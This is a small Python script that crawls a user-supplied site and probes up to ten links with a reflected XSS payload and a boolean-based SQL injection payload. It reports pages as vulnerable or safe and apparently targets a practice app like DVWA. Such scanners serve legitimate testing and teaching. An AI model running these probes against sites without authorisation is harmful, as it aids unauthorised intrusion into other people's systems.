import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import threading
from colorama import Fore, init

init(autoreset=True)

url = input("Enter target URL: ")



def crawl(url):
    links = set()
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")

        for a in soup.find_all("a", href=True):
            full_url = urljoin(url, a["href"])
            if urlparse(full_url).netloc == urlparse(url).netloc:
                links.add(full_url)

    except Exception as e:
        print("Crawl error:", e)

    return list(links)



def get_params(url):
    parsed = urlparse(url)
    return parse_qs(parsed.query)



def xss_scan(url):
    payload = "<script>alert(1)</script>"
    try:
        r = requests.get(url, params={"name": payload}, timeout=5)
        if payload in r.text:
            print(Fore.RED + "[VULNERABLE XSS]:", url)
        else:
            print(Fore.GREEN + "[SAFE] XSS:", url)
    except:
        pass

def sqli_scan(url):
    try:
        r_true  = requests.get(url, params={"id": "1' AND '1'='1"}, timeout=5)
        r_false = requests.get(url, params={"id": "1' AND '1'='2"}, timeout=5)

        indicators = ["surname", "firstname", "user id"]

        if r_true.text != r_false.text and any(k in r_true.text.lower() for k in indicators):
            print(Fore.RED + "[CONFIRMED SQLi]:", url)
        else:
            print(Fore.GREEN + "[SAFE] SQLi:", url)
    except:
        pass

links = crawl(url)

if not links:
    links = [url]

threads = []

for link in links[:10]:
    t1 = threading.Thread(target=xss_scan, args=(link,))
    t2 = threading.Thread(target=sqli_scan, args=(link,))

    t1.start()
    t2.start()

    threads.append(t1)
    threads.append(t2)

for t in threads:
    t.join()

print(Fore.CYAN + "\nScan Completed")
